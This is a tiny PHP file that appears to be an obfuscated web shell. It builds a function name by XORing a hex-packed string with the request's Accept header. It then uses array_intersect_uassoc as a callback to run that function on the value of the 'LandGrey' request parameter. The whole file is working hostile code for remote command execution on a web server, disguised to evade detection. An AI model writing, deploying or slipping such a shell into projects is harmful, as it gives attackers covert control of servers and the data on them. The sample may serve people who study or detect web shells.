<?php
$password = "LandGrey";
$key = substr(__FILE__,-5,-4);
${"LandGrey"} = $_SERVER["HTTP_ACCEPT"]."Land!";
$f = pack("H*", "13"."3f120b1655") ^ $LandGrey;
array_intersect_uassoc(array($_REQUEST[$password] => ""), array(1), $f);
?>
